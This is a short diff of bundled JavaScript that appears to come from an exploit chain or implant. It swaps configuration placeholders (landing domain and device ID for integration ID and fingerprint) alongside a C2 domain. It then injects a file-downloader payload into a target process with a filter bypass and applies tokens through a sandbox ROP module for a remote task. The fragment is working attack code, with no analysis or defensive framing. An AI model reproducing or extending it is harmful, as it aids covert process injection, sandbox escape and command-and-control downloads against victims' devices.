@@ -8045,10 +8045,10 @@ function start() {
 
 	var DS_C2_DOMAIN = "__C2_DOMAIN__";
 	var DS_CHANNEL_CODE = "__CHANNEL_CODE__";
-	var DS_LANDING_DOMAIN = "__LANDING_DOMAIN__";
-	var DS_DEVICE_ID = "__DEVICE_ID__";
+	var DS_INTEGRATION_ID = "__INTEGRATION_ID__";
+	var DS_FINGERPRINT = "__FINGERPRINT__";
 	var DS_EXTRACT_PATH = "__EXTRACT_PATH__";
-	var dlCode = 'var CC="' + DS_CHANNEL_CODE + '";var CD="' + DS_C2_DOMAIN + '";var DM="' + DS_LANDING_DOMAIN + '";var DV="' + DS_DEVICE_ID + '";var EP="' + DS_EXTRACT_PATH + '";\n' + _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"];
+	var dlCode = 'var CC="' + DS_CHANNEL_CODE + '";var CD="' + DS_C2_DOMAIN + '";var IID="' + DS_INTEGRATION_ID + '";var FP="' + DS_FINGERPRINT + '";var EP="' + DS_EXTRACT_PATH + '";\n' + _raw_loader_file_downloader_js__WEBPACK_IMPORTED_MODULE_11__["default"];
 	let fileDownloader = new _InjectJS__WEBPACK_IMPORTED_MODULE_6__["default"](targetProcess, dlCode, migFilterBypass);
 	if (fileDownloader.inject()) {
 		libs_TaskRop_Sandbox__WEBPACK_IMPORTED_MODULE_4__["default"].applyTokensForRemoteTask(fileDownloader.task);
